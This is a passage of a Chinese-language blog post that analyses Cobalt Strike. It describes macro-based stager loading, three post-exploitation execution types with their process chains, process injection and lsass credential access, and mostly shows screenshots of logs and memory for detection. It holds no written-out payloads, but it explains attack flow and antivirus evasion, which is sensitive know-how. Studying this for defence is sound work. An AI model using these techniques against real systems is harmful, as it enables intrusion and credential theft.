+<p><img src="/Analysis-On-CobaltStrike/image-20220310162212253.png" alt="image-20220310162212253"></p>
+<p>日志：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310162306252.png" alt="image-20220310162306252"></p>
+<p>内存：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310164115060.png" alt="image-20220310164115060"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220310165219757.png" alt="image-20220310165219757"></p>
+<p>cobaltstrike 的宏攻击的过程是点击开启了宏的样本后，office程序会通过rundll32.exe加载stager payload ，stager到c2 server 拉取beacon.dll 加载执行。</p>
+<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><p>在执行阶段，根据cobaltstrike的执行方式不同，可以分为3类。</p>
+<p><strong>第一类：如shell和powershell</strong></p>
+<p>1、执行方式</p>
+<p>检测到任务后，直接构建提交，但在执行的时候调用cmd.exe或者powershell.exe 进行命令执行</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312214202785.png" alt="image-20220312214202785"></p>
+<p>2、主机情况</p>
+<p>beacon.exe -&gt; cmd.exe&#x2F;powershell.exe -&gt; whoami.exe -&gt; 命令执行</p>
+<p>cmd.exe</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312214539542.png" alt="image-20220312214539542"></p>
+<p>powershell.exe</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313034733158.png" alt="image-20220313034733158"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313034746367.png" alt="image-20220313034746367"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313034757316.png" alt="image-20220313034757316"></p>
+<p><strong>第二类：如run和execute</strong></p>
+<p>1、执行方式</p>
+<p>检测到任务后，直接构建提交，直接执行</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312214744822.png" alt="image-20220312214744822"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312214804636.png" alt="image-20220312214804636"></p>
+<p>2、主机情况</p>
+<p>beacon.exe -&gt; 命令执行</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312214957532.png" alt="image-20220312214957532"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312215009279.png" alt="image-20220312215009279"></p>
+<p><strong>第三类：powerpick、portscan</strong></p>
+<p>1、执行方式</p>
+<p>检测到任务后，构建构建任务，提交任务，在执行的过程加载rundll32.exe，注入dll，然后通过命名管道与服务端进行通信。</p>
+<p>发布任务</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313032021427.png" alt="image-20220313032021427"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312215750582.png" alt="image-20220312215750582"></p>
+<p>构建任务</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312215818134.png" alt="image-20220312215818134"></p>
+<p>提交任务</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312215836771.png" alt="image-20220312215836771"></p>
+<p>2、主机情况</p>
+<p>beacon.exe  -&gt; rundll32.exe -&gt; beacon.dll -&gt; 命令执行</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312215928379.png" alt="image-20220312215928379"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312215950878.png" alt="image-20220312215950878"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220312220007574.png" alt="image-20220312220007574"></p>
+<h3 id="Process-Inject"><a href="#Process-Inject" class="headerlink" title="Process Inject"></a>Process Inject</h3><p>进程注入是一种在独立的活动进程的地址空间中执行任意代码的方法。</p>
+<p>在另一个进程的上下文中运行代码，会允许访问该进程的内存、系统资源、网络资源以及可能的特权提升。</p>
+<p>由于执行的代码由合法的程序代理执行，因此通过进程注入执行也可能会绕过部分安全产品的防病毒检测或进程白名单检测。</p>
+<p>进程注入是一种广泛使用的躲避检测的技术，通常用于恶意软件或者无文件技术。</p>
+<p>其需要在另一个进程的地址空间内运行特制代码，进程注入改善了不可见性，同时一些技术也实现了持久性。</p>
+<p><a href="%5Bhttps://www.cnblogs.com/LittleHann/p/6336950.html%5D(https://www.cnblogs.com/LittleHann/p/6336950.html#_lab2_0_0)">参考</a></p>
+<p>1、代码实现：</p>
+<p>获取进程id、架构类型、监听器等信息，然后构建任务提交执行</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313212047756.png" alt="image-20220313212047756"></p>
+<p>2、执行过程：</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313212205965.png" alt="image-20220313212205965"></p>
+<p>3、检测过程：</p>
+<p>日志</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313212229657.png" alt="image-20220313212229657"></p>
+<p>内存</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313212334741.png" alt="image-20220313212334741"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313212345875.png" alt="image-20220313212345875"></p>
+<h3 id="Credential-Access"><a href="#Credential-Access" class="headerlink" title="Credential Access"></a>Credential Access</h3><p>1、代码实现</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313235609209.png" alt="image-20220313235609209"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313235633187.png" alt="image-20220313235633187"></p>
+<p>2、执行过程</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313235810994.png" alt="image-20220313235810994"></p>
+<p>3、检测过程</p>
+<p>日志：•beacon.exe -&gt; rundll32.exe -&gt; beacon.dll -&gt; lsass.exe</p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313235844333.png" alt="image-20220313235844333"></p>
+<p><img src="/Analysis-On-CobaltStrike/image-20220313235939201.png" alt="image-20220313235939201"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/firends/">Firends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Infrastructure-Construction"><span class="toc-number">2.</span> <span class="toc-text">Infrastructure Construction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cert"><span class="toc-number">2.1.</span> <span class="toc-text">Cert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Port"><span class="toc-number">2.2.</span> <span class="toc-text">Port</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Protocol"><span class="toc-number">2.3.</span> <span class="toc-text">Protocol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stager"><span class="toc-number">2.4.</span> <span class="toc-text">Stager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login"><span class="toc-number">2.5.</span> <span class="toc-text">Login</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">3.</span> <span class="toc-text">Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Executable"><span class="toc-number">3.1.</span> <span class="toc-text">Windows Executable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Executable-S"><span class="toc-number">3.2.</span> <span class="toc-text">Windows Executable(S)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scripted-Web-Delivery-S"><span class="toc-number">3.3.</span> <span class="toc-text">Scripted Web Delivery (S)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-Application"><span class="toc-number">3.4.</span> <span class="toc-text">HTML Application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS-Office-Macro"><span class="toc-number">3.5.</span> <span class="toc-text">MS Office Macro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">4.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Execution"><span class="toc-number">4.1.</span> <span class="toc-text">Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Process-Inject"><span class="toc-number">4.2.</span> <span class="toc-text">Process Inject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Access"><span class="toc-number">4.3.</span> <span class="toc-text">Credential Access</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/Analysis-On-CobaltStrike/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&text=对CobaltStrike的简单分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&is_video=false&description=对CobaltStrike的简单分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=对CobaltStrike的简单分析&body=Check out this article: https://rj45mp.github.io/Analysis-On-CobaltStrike/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&title=对CobaltStrike的简单分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/Analysis-On-CobaltStrike/&name=对CobaltStrike的简单分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/Analysis-On-CobaltStrike/&t=对CobaltStrike的简单分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Rj45mp
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
